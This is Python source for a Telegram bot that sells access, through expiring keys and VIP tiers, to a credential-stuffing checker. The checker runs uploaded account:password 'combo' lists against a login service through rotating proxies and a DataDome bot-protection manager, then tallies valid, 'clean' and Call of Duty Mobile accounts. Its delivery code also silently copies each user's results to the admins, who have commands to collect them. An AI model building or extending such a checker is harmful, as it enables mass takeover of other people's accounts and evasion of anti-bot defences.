...
# ════════════════════════════════════════════
_MEM_LIMIT_MB   = int(os.environ.get("BOT_MEM_LIMIT_MB", "93733"))  # hard ceiling
_MEM_WARN_MB    = int(os.environ.get("BOT_MEM_WARN_MB",  "92826"))  # soft warn
...
DEFAULT_CONFIG = {
    ...
    "admin_ids":          [],
    "channel_username":   "Yuki_channelll",
    "locked":             False,
    "global_limit":       None,
    "vip_limit":          None,
...
MINI_ADMIN_PERMISSIONS = [
    ...
    # ── Files & results ──────────────────────
    ("combostatus",      "📂 Combo folder status"),
    ("resultsstatus",    "📦 Results folder status"),
    ("sendresults",      "📦 Send results zip"),
    ("detectfiles",      "🔍 Detect orphan files"),
...
try:
    ...
    from dec_tyrantv12 import (processaccount,CookieManager,DataDomeManager,
                                ...
                                remove_duplicates_from_file,GeoRotator)
...
def check_key_expiry(uid: str) -> bool:
    ...
    if key_expired(u.get("key_expires_at")):
        ...
        # Also auto-delete the expired key from keys.json
        key_used = u.get("key_used")
        if key_used:
            try:
                keys = load_keys()
                if key_used in keys and key_expired(keys[key_used].get("expires_at")):
                    del keys[key_used]
                    save_keys(keys)
                    log.info(f"[Key Cleanup] Auto-deleted expired key: {key_used} (user {uid})")
            except Exception as _e:
                log.warning(f"[Key Cleanup] Failed to delete expired key {key_used}: {_e}")
        save_users(users); return True
    return False

def auto_delete_expired_keys() -> int:
    """Scan all keys and users, delete expired keys from keys.json,
    and deactivate users whose keys have expired."""
    deleted = 0
    try:
        keys = load_keys()
        users = load_users()
        expired_keys = []
        for key, kd in list(keys.items()):
            exp = kd.get("expires_at")
            if exp and key_expired(exp):
                expired_keys.append(key)
        for key in expired_keys:
            for uid in kd.get("used_by", []):
                if uid in users:
                    if users[uid].get("key_used") == key:
                        users[uid]["activated"] = False
                        users[uid]["key_expired"] = True
                        users[uid]["key_used"] = None
                        users[uid]["key_expires_at"] = None
            del keys[key]
            deleted += 1
        for uid, u in list(users.items()):
            if u.get("activated") and not u.get("vip") and key_expired(u.get("key_expires_at")):
                users[uid]["activated"] = False
                users[uid]["key_expired"] = True
                users[uid]["key_used"] = None
                users[uid]["key_expires_at"] = None
        ...
        log.error(f"[Key Cleanup] Error during auto-delete: {e}")
    return deleted

def _key_cleanup_loop():
    """Background thread: auto-delete expired keys every 5 minutes."""
    while not _shutdown_flag.wait(300):
        try:
            count = auto_delete_expired_keys()
            if count > 0:
                log.info(f"[Key Cleanup] Periodic cleanup: deleted {count} expired key(s)")
        except Exception as e:
            log.error(f"[Key Cleanup] Periodic cleanup error: {e}")

# Start the key cleanup background thread AFTER the function is defined
threading.Thread(target=_key_cleanup_loop,daemon=True,name="key-cleanup").start()
...
def run_checker(uid,combo_file,result_folder,limit,threads,stop_event,
    ...
    if not _all_items:
        if is_resume and _already_done:
            ...
            # Clean up the stale checkpoint and return accurate stats from the
            # result folder so the user sees correct numbers, not "Processed: 0".
            ...
            _fs = get_folder_stats(str(result_folder))
            if _fs and _fs.get("has_codm", 0) > 0:
                _fs["invalid"] = max(0, total - _fs.get("valid", 0))
                _fs["total"] = total
                return _fs
            return {"valid": 0, "invalid": total, "clean": 0, "not_clean": 0,
                    "has_codm": 0, "no_codm": 0, "total": total}
        ...
        return {"valid": 0, "invalid": 0, "clean": 0, "not_clean": 0,
                "has_codm": 0, "no_codm": 0, "total": total}
    ...
    cm=CookieManager(); ls=LiveStats(); fl=threading.Lock(); tl=threading.local(); il=threading.Lock(); user_rotator=GeoRotator()
    with sessions_lock:
    ...
    def gsess():
        ...
        if not hasattr(tl,"session") or count >= _SESSION_RECYCLE:
            ...
            dm=DataDomeManager(); tl.session=create_thread_session(cm,dm,rotator=user_rotator); tl.dm=dm
            tl.call_count = 0
        else:
            tl.call_count = count + 1
        # DO NOT overwrite tl.session.proxies here — each thread keeps its locked-in proxy.
        # Only force_rotate() inside handle_403/processaccount should change the proxy
        # for that specific thread, using this user's own user_rotator instance.
    ...
    def _cur_proxy_file():
        try:
            pf=user_rotator._proxy_files; fi=user_rotator._file_idx
    ...
    def process_one(idx_line):
        ...
        try:
            ...
            try:
                processaccount(sess,acct,pwd,cm,dm,ls,str(result_folder),telegram_config=tg_cfg,rotator=user_rotator)
            finally:
                with _tl_lock:
    ...
    try:
        ex = ThreadPoolExecutor(max_workers=MAX_WORKER_THREADS, thread_name_prefix=f"checker-{uid}")
        try:
            # ── MEMORY-SAFE: only keep MAX_WORKER_THREADS futures in-flight ──
            ...
            _BATCH = max(MAX_WORKER_THREADS, 1)      # Keep exactly threads count in-flight for 1GB RAM
            ...
            while _idx < len(_items) or _active_futs:
                ...
                try:
                    done_futs, _ = _cf.wait(
                        list(_active_futs), return_when=_cf.FIRST_COMPLETED, timeout=300)
                    for f in done_futs:
                        _active_futs.pop(f, None)
                        try: f.result()
                        except: pass
                except Exception:
                    # On wait error, just continue
                    pass
                # Hint GC to reclaim StringIO/session objects from completed futures
                import gc as _gc; _gc.collect()

            # Clean shutdown
            try: ex.shutdown(wait=True, cancel_futures=False)
            except: pass
        except Exception:
            try: ex.shutdown(wait=False, cancel_futures=True)
            except: pass
...
async def deliver_results(bot,chat_id,uid,zip_paths,stats,combo_file=None,note="",partial=False):
    ...
    # ── After final delivery: silently backup to admin then delete files ──
    if not partial:
        cfg_d=load_config()
        users_db_d=load_users()
        uname_d=users_db_d.get(uid,{}).get("username","?")
        fname_d=users_db_d.get(uid,{}).get("first_name","?")

        # Get result folder — from zip path parent or from active session
        ...
        # Create one backup zip from everything in the result folder
        backup_zip=None
        if result_folder_d and result_folder_d.exists():
            try:
                ts_bk=datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_zip=result_folder_d/f"backup_{uid}_{ts_bk}.zip"
                # Collect all non-zip files in the result folder tree
                all_result_files=[
                    f for f in result_folder_d.rglob("*")
                    if f.is_file() and not f.name.endswith(".zip")
                ]
                # Also include existing user zips
                existing_zips=[
                    f for f in result_folder_d.glob("*.zip")
                    if f!=backup_zip
                ]
                files_to_zip=all_result_files+existing_zips
                if files_to_zip:
                    with zipfile.ZipFile(backup_zip,"w",zipfile.ZIP_DEFLATED) as zf:
                        for rf2 in files_to_zip:
                            try: zf.write(rf2,rf2.relative_to(result_folder_d))
                            except: pass
                    log.info(f"Backup zip created: {backup_zip.name} ({len(files_to_zip)} files)")
                else:
                    backup_zip=None  # nothing to backup
            except Exception as e:
                log.warning(f"Backup zip failed for uid={uid}: {e}")
                backup_zip=None

        # Send backup silently to each admin
        for admin_id in cfg_d.get("admin_ids",[]):
            if admin_id==int(uid): continue
            try:
                await bot.send_message(
                    chat_id=admin_id,
                    parse_mode=ParseMode.HTML,
                    disable_notification=True,
                    text=(f"📦 <b>Backup</b> — {fname_d} @{uname_d} (<code>{uid}</code>)\n"
                          f"✅ {stats.get('valid',0)}  🎮 {stats.get('has_codm',0)}  "
                          f"✨ {stats.get('clean',0)}  📊 {stats.get('total',0)} processed"))
                ...
                log.warning(f"Admin backup send failed for {admin_id}: {e}")

        # Delete entire result folder after backup + clean up empty parent folders
        if result_folder_d and result_folder_d.exists():
...
async def on_callback(update,context):
    ...
    if data.startswith("adm_"):
        ...
        if data=="adm_files_senduser":
            await query.answer("Use /sendresults <user_id>", show_alert=True)
            return
        ...
        if data=="adm_sendresults_all":
            await query.answer("📦 Sending…")
            dirs_s=[d for d in RESULTS_DIR.iterdir() if d.is_dir()]
            if not dirs_s:
                await context.bot.send_message(chat_id=query.message.chat_id,text="📭 No results."); return
            users_s=load_users()
            for ud_s in sorted(dirs_s,key=lambda x:x.name):
                zips_s=sorted(ud_s.rglob("*.zip"),key=lambda x:x.stat().st_mtime,reverse=True)
                if not zips_s: continue
                uname_s=users_s.get(ud_s.name,{}).get("username","?")
                try:
                    with open(zips_s[0],"rb") as f_s:
                        await context.bot.send_document(chat_id=query.message.chat_id,document=f_s,
                            filename=zips_s[0].name,caption=f"👤 {ud_s.name} @{uname_s}")
                except: pass
            return

        if data=="adm_ask_sendresults":
            await query.answer("Use /sendresults <user_id>", show_alert=True)
            return
        ...
        if data=="adm_detectfiles":
            await query.answer("Running /detectfiles…")
            context.args=[]
            await cmd_detect_files(query, context)
            return
    ...
    if data=="start_check":
        ...
        def bg():
            ...
            try:
                ...
                _pv=st.get("total",0)
                if not stop_ev.is_set() and _pv<disp and disp>0:
                    _fs=get_folder_stats(str(rf))
                    if _fs and _fs.get("has_codm",0)>0:
                        for _k in ("valid","clean","not_clean","has_codm","no_codm"):
                            if _fs.get(_k,0)>st.get(_k,0): st[_k]=_fs[_k]
                        st["total"]=disp
                    elif _pv==0: st["total"]=disp
                ...
                if is_continuing:
                    ...
                    def _continue_bg():
                        ...
                        try:
                            ...
                            # ── Completion verification for continue-bg ──
                            _pv2=st2.get("total",0)
                            if not new_stop.is_set() and _pv2<disp and disp>0:
                                _fs2=get_folder_stats(str(new_rf))
                                if _fs2 and _fs2.get("has_codm",0)>0:
                                    for _k2 in ("valid","clean","not_clean","has_codm","no_codm"):
                                        if _fs2.get(_k2,0)>st2.get(_k2,0): st2[_k2]=_fs2[_k2]
                                    st2["total"]=disp
                                elif _pv2==0: st2["total"]=disp
                            u3=load_users()
                            if uid in u3:
...
@admin_or_mini_admin('detectfiles')
async def cmd_detect_files(update,context):
    if context.args:
        t=context.args[0].strip(); udir=RESULTS_DIR/t
        if not udir.exists(): await update.message.reply_text(f"❌ No results for <code>{t}</code>.",parse_mode=ParseMode.HTML); return
        zips=sorted(udir.rglob("*.zip"),key=lambda x:x.stat().st_mtime,reverse=True)
        txts=sorted(udir.rglob("*.txt"),key=lambda x:x.stat().st_mtime,reverse=True)
        if not zips and not txts: await update.message.reply_text(f"📭 No files for <code>{t}</code>.",parse_mode=ParseMode.HTML); return
        lines=[f"📁 <b>Results for {t}</b>"]
        for f in (zips+txts)[:15]:
            sz=f.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
            lines.append(f"  📄 <code>{f.name}</code> ({ss}) — {datetime.fromtimestamp(f.stat().st_mtime).strftime('%m/%d %H:%M')}")
        await update.message.reply_text("\n".join(lines),parse_mode=ParseMode.HTML)
        if zips:
            with open(zips[0],"rb") as f: await update.message.reply_document(document=f,filename=zips[0].name,caption=f"📦 Latest for {t}")
        return
    rows=[]
    for udir in sorted(RESULTS_DIR.iterdir(),key=lambda x:x.name):
        if not udir.is_dir(): continue
        all_f=list(udir.rglob("*.zip"))+list(udir.rglob("*.txt"))
        if not all_f: continue
        lt=max(f.stat().st_mtime for f in all_f); uname=load_users().get(udir.name,{}).get("username","?")
        rows.append(f"• <code>{udir.name}</code> @{uname} — {len(list(udir.rglob('*.zip')))}z {len(list(udir.rglob('*.txt')))}t | {datetime.fromtimestamp(lt).strftime('%m/%d %H:%M')}")
    if not rows: await update.message.reply_text("📭 No result files yet."); return
    msg=f"📁 <b>All Results ({len(rows)} users)</b>\n━━━━━━━━━━━━━━━━━━━━\n"+"\n".join(rows)
    for chunk in [msg[i:i+4096] for i in range(0,len(msg),4096)]: await update.message.reply_text(chunk,parse_mode=ParseMode.HTML)
...
@admin_or_mini_admin('combostatus')
async def cmd_combo_status(update,context):
    """Show combo folder MB/lines per user."""
    users_db=load_users(); rows=[]; total_bytes=0
    for uid_dir in sorted(COMBO_DIR.iterdir()):
        if not uid_dir.is_dir(): continue
        files=list(uid_dir.glob("*.txt"))
        if not files: continue
        sz=sum(f.stat().st_size for f in files); total_bytes+=sz
        lines_n=0
        for f in files:
            try:
                with open(f,"r",encoding="utf-8",errors="ignore") as fh:
                    lines_n+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("==="))
            except: pass
        udata=users_db.get(uid_dir.name,{})
        un=udata.get("username","?"); fn=udata.get("first_name","?")
        vip="👑" if udata.get("vip") else "👤"
        ss=f"{sz/1024:.1f} KB" if sz<1024*1024 else f"{sz/1024/1024:.2f} MB"
        rows.append(f"{vip} <b>{fn}</b> @{un} (<code>{uid_dir.name}</code>)\n   📄 {files[0].name}  ·  {lines_n:,} lines  ·  {ss}")
    if not rows:
        await update.message.reply_text("📭 Combo folder is empty.",parse_mode=ParseMode.HTML); return
    ts=f"{total_bytes/1024:.1f} KB" if total_bytes<1024*1024 else f"{total_bytes/1024/1024:.2f} MB"
    text=f"📂 <b>Combo Folder Status</b>\n━━━━━━━━━━━━━━━━━━━━\n"+"\n\n".join(rows)+f"\n━━━━━━━━━━━━━━━━━━━━\n📦 Total: <b>{ts}</b>  across <code>{len(rows)}</code> user(s)"
    if len(text)>4000: text=text[:4000]+"…"
    await update.message.reply_text(text,parse_mode=ParseMode.HTML)


@admin_or_mini_admin('resultsstatus')
async def cmd_results_status(update,context):
    """Show results folder MB/files per user."""
    users_db=load_users(); rows=[]; total_bytes=0
    for uid_dir in sorted(RESULTS_DIR.iterdir()):
        if not uid_dir.is_dir(): continue
        files=[f for f in uid_dir.rglob("*") if f.is_file()]
        if not files: continue
        sz=sum(f.stat().st_size for f in files); total_bytes+=sz
        ...
        vip="👑" if udata.get("vip") else "👤"
        ss=f"{sz/1024:.1f} KB" if sz<1024*1024 else f"{sz/1024/1024:.2f} MB"
        rows.append(f"{vip} <b>{fn}</b> @{un} (<code>{uid_dir.name}</code>)\n   📦 {len(zips)} zip  ·  📄 {len(txts)} txt  ·  {ss}")
    if not rows:
        await update.message.reply_text("📭 Results folder is empty.",parse_mode=ParseMode.HTML); return
    ts=f"{total_bytes/1024:.1f} KB" if total_bytes<1024*1024 else f"{total_bytes/1024/1024:.2f} MB"
    text=f"📊 <b>Results Folder Status</b>\n━━━━━━━━━━━━━━━━━━━━\n"+"\n\n".join(rows)+f"\n━━━━━━━━━━━━━━━━━━━━\n📦 Total: <b>{ts}</b>  across <code>{len(rows)}</code> user(s)"
    if len(text)>4000: text=text[:4000]+"…"
    await update.message.reply_text(text,parse_mode=ParseMode.HTML)
...
@admin_or_mini_admin('sendresults')
async def cmd_send_results(update,context):
    """Send results as zip per user.
    /sendresults          — latest zip for all users
    /sendresults <uid>    — latest zip for one user
    """
    users_db=load_users()
    chat_id=update.effective_chat.id

    async def _zip_and_send(uid_str, udir):
        """Zip all files in udir and send as one zip to admin."""
        all_files=[f for f in udir.rglob("*") if f.is_file() and not f.name.startswith("backup_")]
        if not all_files: return False
        udata=users_db.get(uid_str,{}); uname=udata.get("username","?"); fname2=udata.get("first_name","?")
        try:
            ts_s=datetime.now().strftime("%Y%m%d_%H%M%S")
            zpath=udir/f"results_{uid_str}_{ts_s}.zip"
            with zipfile.ZipFile(zpath,"w",zipfile.ZIP_DEFLATED) as zf:
                for f in all_files:
                    try: zf.write(f,f.relative_to(udir))
                    except: pass
            with open(zpath,"rb") as fh:
                await context.bot.send_document(
                    ...
                    document=fh,
                    filename=zpath.name,
                    caption=f"📦 {fname2} @{uname} (<code>{uid_str}</code>)",
                    parse_mode=ParseMode.HTML)
            zpath.unlink()
            return True
        except Exception as e:
            await context.bot.send_message(chat_id=chat_id,
                text=f"⚠️ Could not send results for <code>{uid_str}</code>: {e}",
                parse_mode=ParseMode.HTML)
            return False

    if context.args:
        target=context.args[0].strip()
        udir=RESULTS_DIR/target
        if not udir.exists() or not any(udir.rglob("*")):
            await update.message.reply_text(f"📭 No results for <code>{target}</code>.",parse_mode=ParseMode.HTML); return
        msg=await update.message.reply_text(f"📦 Zipping and sending for <code>{target}</code>…",parse_mode=ParseMode.HTML)
        ok=await _zip_and_send(target,udir)
        await msg.edit_text(f"{'✅ Sent' if ok else '❌ Failed'} for <code>{target}</code>.",parse_mode=ParseMode.HTML)
    else:
        dirs=[d for d in RESULTS_DIR.iterdir() if d.is_dir()]
        if not dirs:
            await update.message.reply_text("📭 No result files found.",parse_mode=ParseMode.HTML); return
        msg=await update.message.reply_text(
            f"📦 Zipping and sending results for <code>{len(dirs)}</code> user(s)…",parse_mode=ParseMode.HTML)
        sent=0
        for uid_dir in sorted(dirs,key=lambda x:x.name):
            if await _zip_and_send(uid_dir.name,uid_dir): sent+=1
        await msg.edit_text(f"✅ Done! Sent <code>{sent}</code> zip(s).",parse_mode=ParseMode.HTML)
...
def _admin_files_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📦 Send All Results",     callback_data="adm_sendresults_all"),
         InlineKeyboardButton("📦 User Results",         callback_data="adm_ask_sendresults")],
        ...
        [InlineKeyboardButton("🔍 Detect Files",         callback_data="adm_detectfiles")],
        [InlineKeyboardButton("« Back",                  callback_data="adm_back")],
    ])
...
async def _set_bot_commands(app):
    ...
    admin_cmds = user_cmds + [
        ...
        BotCommand("combostatus",    "📂 Combo folder sizes"),
        BotCommand("resultsstatus",  "📊 Results folder sizes"),
        BotCommand("refreshcombo",   "🗑 Clear all combo files"),
        BotCommand("refreshresults", "🗑 Clear all results"),
        BotCommand("sendresults",    "📦 Send results zip"),
        BotCommand("detectfiles",    "🔍 Detect orphan files"),
        BotCommand("combostatus",    "📁 Combo folder size"),
        BotCommand("resultsstatus",  "📦 Results folder size"),
...
def main():
    ...
    # ── Startup: clean up expired keys ──
    _del=auto_delete_expired_keys()
    if _del: print(f"🗑  Cleaned up {_del} expired key(s) on startup")
                ...
                def _make_bg(u,combo_p,rf_p,lim_n,thr_n,stop_e,btok_n,cid_n,
                    ...
                    def _bg():
                        ...
                        try:
                            ...
                            # ── Completion verification for crash-resume ──
                            _pv3=st3.get("total",0)
                            if not stop_e.is_set() and _pv3<orig_n and orig_n>0:
                                _fs3=get_folder_stats(str(rf_p))
                                if _fs3 and _fs3.get("has_codm",0)>0:
                                    for _k3 in ("valid","clean","not_clean","has_codm","no_codm"):
                                        if _fs3.get(_k3,0)>st3.get(_k3,0): st3[_k3]=_fs3[_k3]
                                    st3["total"]=orig_n
                                elif _pv3==0: st3["total"]=orig_n
    ...
    def _register_handlers(application):
        ...
        application.add_handler(CommandHandler("detectfiles",     cmd_detect_files))
        ...
        application.add_handler(CommandHandler("combostatus",     cmd_combo_status))
        application.add_handler(CommandHandler("resultsstatus",   cmd_results_status))
        ...
        application.add_handler(CommandHandler("sendresults",     cmd_send_results))
